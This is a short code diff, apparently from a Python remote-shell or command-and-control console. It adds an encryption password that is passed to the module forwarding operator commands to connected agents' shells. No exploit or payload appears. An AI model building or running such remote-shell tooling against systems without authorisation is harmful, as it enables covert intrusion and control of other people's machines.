@@ -24,7 +24,7 @@ class Agent(Cmd):
         """Override default method, to send unknow command to remote shell"""
         try: 
 
-            modules.Shell(self.channel, cmd)
+            modules.Shell(self.channel, self.password, cmd)
 
         except ConnectionResetError:
             print(colored(f"\n[-] Channel reset by peer", 'red'))
@@ -48,6 +48,10 @@ class Agent(Cmd):
         """Define the open socket to interact with agent"""
         self.channel = arg
 
+    def define_password(self, arg):
+        """Define password used for encryption/decryption (messages and files)"""
+        self.password = arg
+
 
 # < -------------------------- COMMANDS -------------------------- >
 
@@ -69,9 +73,6 @@ class Agent(Cmd):
 
         except ConnectionResetError:
             print(colored(f"\n[-] Channel reset by peer", 'red'))
-            return True
-
-        except BrokenPipeError:
             print(colored(f"\n[-] Channel reset by peer (broken pipe error)", 'red'))
             return True
         
@@ -235,6 +236,7 @@ def bindAgent(dictionnary):
             agentPrompt = Agent()
             agentPrompt.prompt = colored(f"agent@{host}:{port} > ", 'green') 
             agentPrompt.define_channel(channel)
+            agentPrompt.define_password(password)
             agentPrompt.cmdloop()
 
         except KeyboardInterrupt:
